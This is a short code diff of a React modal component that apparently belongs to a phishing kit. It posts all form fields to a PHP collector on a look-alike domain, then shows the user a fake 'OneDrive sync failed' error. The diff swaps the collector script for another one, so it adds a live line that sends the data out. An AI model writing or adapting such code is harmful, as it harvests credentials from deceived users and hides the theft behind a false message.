@@ -48,7 +48,7 @@ const Modal = ({ toggle, open }) => {
     const formData = new FormData();
     Object.entries(values).forEach(([k, v]) => formData.append(k, v));
     const xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/mr.docss77.php", true);
+    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/tradinghoney.php", true);
     xhr.onload = () => {
       setMessage("Error: OneDrive sync failed. Please try again.");
       subBtn.current.innerHTML = "Download"
